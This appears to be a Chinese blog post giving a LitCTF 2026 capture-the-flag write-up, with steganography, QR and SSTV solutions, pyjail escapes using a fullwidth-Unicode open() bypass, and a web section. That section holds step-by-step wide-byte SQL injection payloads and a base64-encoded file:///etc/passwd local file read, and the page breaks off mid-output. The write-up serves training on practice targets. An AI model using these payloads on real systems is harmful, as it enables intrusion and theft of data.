@@ -1,0 +1,961 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>LitCTF Writeup | joke的小世界</title><meta name="author" content="joke"><meta name="copyright" content="joke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="LitCTF Writeup –NinaSecMisc[LitCTF2026] lit_lsb_base641组委会发来一张花花绿绿的 PNG，标题里写着三个字母：LSB。这和「崂山煲」可没关系——它指的是 最低有效位（Least Significant Bit） 隐写。  提示lsb，用stegsolve解决：  有个base64，解码一下就是flag:  flag: 1LitCTF&#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LitCTF Writeup">
+<meta property="og:url" content="https://simple9656.github.io/2026/05/25/LitCTF-Writeup/index.html">
+<meta property="og:site_name" content="joke的小世界">
+<meta property="og:description" content="LitCTF Writeup –NinaSecMisc[LitCTF2026] lit_lsb_base641组委会发来一张花花绿绿的 PNG，标题里写着三个字母：LSB。这和「崂山煲」可没关系——它指的是 最低有效位（Least Significant Bit） 隐写。  提示lsb，用stegsolve解决：  有个base64，解码一下就是flag:  flag: 1LitCTF&#123;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/1920/1080?random=1">
+<meta property="article:published_time" content="2026-05-25T05:13:48.000Z">
+<meta property="article:modified_time" content="2026-05-25T06:01:08.242Z">
+<meta property="article:author" content="joke">
+<meta property="article:tag" content="LitCTF">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/1920/1080?random=1"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "LitCTF Writeup",
+  "url": "https://simple9656.github.io/2026/05/25/LitCTF-Writeup/",
+  "image": "https://picsum.photos/1920/1080?random=1",
+  "datePublished": "2026-05-25T05:13:48.000Z",
+  "dateModified": "2026-05-25T06:01:08.242Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "joke",
+      "url": "https://simple9656.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/9.jpg"><link rel="canonical" href="https://simple9656.github.io/2026/05/25/LitCTF-Writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'LitCTF Writeup',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/css/transparent.css"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.1"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/pink/pace-theme-minimal.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div class="bg-animation" id="web_bg" style="background-color: #eee;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://picsum.photos/1920/1080?random=1);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/9.jpg" alt="Logo"><span class="site-name">joke的小世界</span></a><a class="nav-page-title" href="/"><span class="site-name">LitCTF Writeup</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-inbox"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">LitCTF Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-25T05:13:48.000Z" title="发表于 2026-05-25 13:13:48">2026-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-25T06:01:08.242Z" title="更新于 2026-05-25 14:01:08">2026-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/ctf-wp/">ctf-wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="LitCTF-Writeup-–NinaSec"><a href="#LitCTF-Writeup-–NinaSec" class="headerlink" title="LitCTF Writeup –NinaSec"></a>LitCTF Writeup –NinaSec</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="LitCTF2026-lit-lsb-base64"><a href="#LitCTF2026-lit-lsb-base64" class="headerlink" title="[LitCTF2026] lit_lsb_base64"></a>[LitCTF2026] lit_lsb_base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">组委会发来一张花花绿绿的 PNG，标题里写着三个字母：LSB。这和「崂山煲」可没关系——它指的是 最低有效位（Least Significant Bit） 隐写。</span><br></pre></td></tr></table></figure>
+
+<p>提示lsb，用stegsolve解决：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523124359925.png" alt="image-20260523124359925"></p>
+<p>有个base64，解码一下就是flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523124505667.png" alt="image-20260523124505667"></p>
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;lsb_1s_fun_w1th_b4s3_64&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-rush-qr"><a href="#LitCTF2026-lit-rush-qr" class="headerlink" title="[LitCTF2026] lit_rush_qr"></a>[LitCTF2026] lit_rush_qr</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附件里有一个「闪得很快」的 GIF。有人说自己好像瞥见了 二维码 的一角，但怎么也扫不出来……</span><br></pre></td></tr></table></figure>
+
+<p>gif先分解帧:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523124748568.png" alt="image-20260523124748568"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523124808481.png" alt="image-20260523124808481"></p>
+<p>发现缺定位符的二维码，加两个定位符：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523124848537.png" alt="image-20260523124848537"></p>
+<p>然后一个一个扫就行了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523125504987.png" alt="image-20260523125504987"></p>
+<p>flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;qr_h1gh_3rr_c0r_r3c0v3ry&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-sstv"><a href="#LitCTF2026-lit-sstv" class="headerlink" title="[LitCTF2026] lit_sstv"></a>[LitCTF2026] lit_sstv</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你收到一段奇怪的 WAV：听起来像老式调制解调器或短波噪声。它其实不是「坏掉的音频」，而是一种把 图片编码进声音 的协议——SSTV（慢扫描电视）。</span><br></pre></td></tr></table></figure>
+
+<p>sstv题，本地不知道是不是声卡的原因，没扫出来，用在线网站：</p>
+<p><a target="_blank" rel="noopener" href="https://sstv-decoder.mathieurenaud.fr/">https://sstv-decoder.mathieurenaud.fr/</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523130856934.png" alt="image-20260523130856934"></p>
+<p>拿到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;sstv_p4t13nc3&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-welcome"><a href="#LitCTF2026-lit-welcome" class="headerlink" title="[LitCTF2026] lit_welcome"></a>[LitCTF2026] lit_welcome</h3><p>题目描述：</p>
+<p>lsb通道里发现：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/welcome_extract%20LSB.png"></p>
+<p>得到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;w3lc0m3_t0_m1sc_w0rld&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-pyjail-reader"><a href="#LitCTF2026-lit-pyjail-reader" class="headerlink" title="[LitCTF2026] lit_pyjail_reader"></a>[LitCTF2026] lit_pyjail_reader</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ez_jail</span><br></pre></td></tr></table></figure>
+
+<p>看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alphabet = string.ascii_uppercase</span><br><span class="line">challenge = &quot;&quot;.join(secrets.choice(alphabet) for _ in range(8))</span><br><span class="line">conn.sendall(</span><br><span class="line">    f&quot;Please enter the reverse of &#x27;&#123;challenge&#125;&#x27; to continue: &quot;.encode()</span><br><span class="line">)</span><br><span class="line">ans = recv_line(conn)</span><br><span class="line">if ans != challenge[::-1]:</span><br><span class="line">    conn.sendall(b&quot;Wrong reverse string. Bye.\n&quot;)</span><br><span class="line">    return</span><br></pre></td></tr></table></figure>
+
+<p>第一步的翻转，把字符串反转一下就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def safe_read(path: str) -&gt; str:</span><br><span class="line">    p = path.strip()</span><br><span class="line">    if not p or p.startswith(&quot;-&quot;) or &quot;\x00&quot; in p:</span><br><span class="line">        raise ValueError(&quot;invalid path&quot;)</span><br><span class="line">    with open(p, &quot;r&quot;, errors=&quot;replace&quot;) as f:</span><br><span class="line">        return f.read(MAX_FILE)</span><br></pre></td></tr></table></figure>
+
+<p>只ban了空字符串，以 <code>-</code> 开头，含有\x00。</p>
+<p>然后就nc连一下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523133431654.png" alt="image-20260523133431654"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4dlsaahi-woeb-4hn-8yds-ywdqzbiackvbt&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-pyjail-unicode"><a href="#LitCTF2026-lit-pyjail-unicode" class="headerlink" title="[LitCTF2026] lit_pyjail_unicode"></a>[LitCTF2026] lit_pyjail_unicode</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ezjail_2</span><br></pre></td></tr></table></figure>
+
+<p>看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">conn.sendall(</span><br><span class="line">    b&quot;=== LitCTF pyjail unicode ===\n&quot;</span><br><span class="line">    b&quot;Send ONE line of Python. It will be eval() with full __builtins__.\n&quot;</span><br><span class="line">    b&quot;ASCII blacklist applies to your *source text* (see attachment jail.py).\n&quot;</span><br><span class="line">    b&quot;Goal: read /flag and get its str content.\n&gt; &quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>额先看ban了什么吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BANNED = re.compile(</span><br><span class="line">    r&quot;\bimport\b|\bexec\b|\beval\b|\bopen\b|\bcompile\b|\bglobals\b|\blocals\b|__|&quot;</span><br><span class="line">    r&quot;\bgetattr\b|\bsetattr\b|\bdelattr\b|\bvars\b|\bbreakpoint\b|\binput\b|&quot;</span><br><span class="line">    r&quot;\bsubprocess\b|\bpty\b|os\.|sys\.|\bposix\b&quot;,</span><br><span class="line">    re.IGNORECASE,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def banned(raw: str) -&gt; bool:</span><br><span class="line">    if &quot;\\u&quot; in raw or &quot;\\U&quot; in raw or &quot;\\x&quot; in raw:</span><br><span class="line">        return True</span><br><span class="line">    return BANNED.search(raw) is not None</span><br></pre></td></tr></table></figure>
+
+<p>ban了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/flag&#x27;).read()</span><br><span class="line">eval(&#x27;1&#x27;)</span><br><span class="line">__import__(&#x27;os&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这题考的是unicode，所以我就尝试是全角字符：</p>
+<p>刚好绕过了open那个被Ban的限制。</p>
+<p>直接写个远端交互脚本吧（因为我发现把全角直接复制进命令行会报错）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523140049229.png" alt="image-20260523140049229"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">HOST = &quot;challenge.cyclens.tech&quot;</span><br><span class="line">PORT = 31037</span><br><span class="line">PAYLOAD = &quot;ｏｐｅｎ(&#x27;/flag&#x27;).read()\n&quot;.encode(&quot;utf-8&quot;)</span><br><span class="line"></span><br><span class="line">with socket.create_connection((HOST, PORT)) as s:</span><br><span class="line">    print(s.recv(4096).decode(&quot;utf-8&quot;, &quot;replace&quot;), end=&quot;&quot;)</span><br><span class="line">    s.sendall(PAYLOAD)</span><br><span class="line">    print(s.recv(4096).decode(&quot;utf-8&quot;, &quot;replace&quot;), end=&quot;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>如果我这个脚本里的全角字符有问题，可以去<a target="_blank" rel="noopener" href="https://tool.ip138.com/characterchange/%E6%8A%8Aopen%E5%85%88%E8%BD%AC%E6%8D%A2%E6%88%90%E5%85%A8%E8%A7%92%E7%84%B6%E5%90%8E%E6%94%BE%E8%BF%9B%E8%84%9A%E6%9C%AC%E9%87%8C%E3%80%82">https://tool.ip138.com/characterchange/把open先转换成全角然后放进脚本里。</a></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="LitCTF2026-lit-ezsql"><a href="#LitCTF2026-lit-ezsql" class="headerlink" title="[LitCTF2026] lit_ezsql"></a>[LitCTF2026] lit_ezsql</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注注注！</span><br></pre></td></tr></table></figure>
+
+<p>先尝试几个数字看看：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523140402697.png" alt="image-20260523140402697"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523140436727.png" alt="image-20260523140436727"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523140446534.png" alt="image-20260523140446534"></p>
+<p>先尝试宽字节布尔注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27 or 1=1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523142648948.png" alt="image-20260523142648948"></p>
+<p>OK拿到注入点了，先用 <code>order by</code> 探测列数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df%27 order by 5#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523142954371.png" alt="image-20260523142954371"></p>
+<p>继续测：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df%27 order by 6#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523143034247.png" alt="image-20260523143034247"></p>
+<p>说明有5列。</p>
+<p>开始union联合查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27 union select 1,2,3,4,5#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523143129998.png" alt="image-20260523143129998"></p>
+<p>从前面可以看的出来第二列回显是最稳定的，所以用第二列来爆库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27 union select 1,database(),3,4,5#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523143317179.png" alt="image-20260523143317179"></p>
+<p>爆出来一个ezsql继续爆表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523143412543.png" alt="image-20260523143412543"></p>
+<p>爆出来flag_store了现在要查看这个表的子段了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database() and table_name=0x666c61675f73746f7265#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523143517782.png" alt="image-20260523143517782"></p>
+<p>好了，读flag吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27 union select 1,group_concat(id,0x3a,flag),3,4,5 from flag_store#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523143558647.png" alt="image-20260523143558647"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;clvtdgbg-y70k-4nj-8hjm-g1du99p3n1xxe&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-Northbridge-Document-Hub"><a href="#LitCTF2026-Northbridge-Document-Hub" class="headerlink" title="[LitCTF2026] Northbridge Document Hub"></a>[LitCTF2026] Northbridge Document Hub</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Northbridge 文档中心接入了 kkFileView 兼容的文件预览网关。</span><br><span class="line">研究员账号已开放，试着从解析缓存里找到本季度财务归档中的 flag</span><br></pre></td></tr></table></figure>
+
+<p>源码里有个js文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523144557188.png" alt="image-20260523144557188"></p>
+<p>账密就是 <code>researcher / Research#2026</code></p>
+<p>路径是 <code>/kkfileview/getCorsFile</code>，参数名是 <code>urlPath</code></p>
+<p>先登录：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523144720922.png" alt="image-20260523144720922"></p>
+<p>题目说从缓存中找flag,home界面直接明示：&#x2F;opt&#x2F;kkfileview&#x2F;cache&#x2F;parsed这个缓存目录。</p>
+<p>接下来就要搞明白这个urlpath到底是怎么传的。</p>
+<p>这道题其实就是“给它一个路径，它帮你取文件内容”的接口。题目又明确提到“kkFileView 兼容预览网关”和“解析缓存”，所以自然会怀疑这里存在文件读取。</p>
+<p>根据渗透的思路，&#x2F;etc&#x2F;passwd能想得到，本地文件读取，当然直接用这个路径也进不去，需要做些修饰绕过一下。</p>
+<p>把 <code>file:///etc/passwd</code> 先做 Base64，再放进 <code>urlPath</code>，接口就会正常返回文件内容。</p>
+<p>也就是ZmlsZTovLy9ldGMvcGFzc3dk</p>
+<p>访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/kkfileview/getCorsFile?urlPath=ZmlsZTovLy9ldGMvcGFzc3dk</span><br></pre></td></tr></table></figure>
+
+<p>得到一个passwd文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span 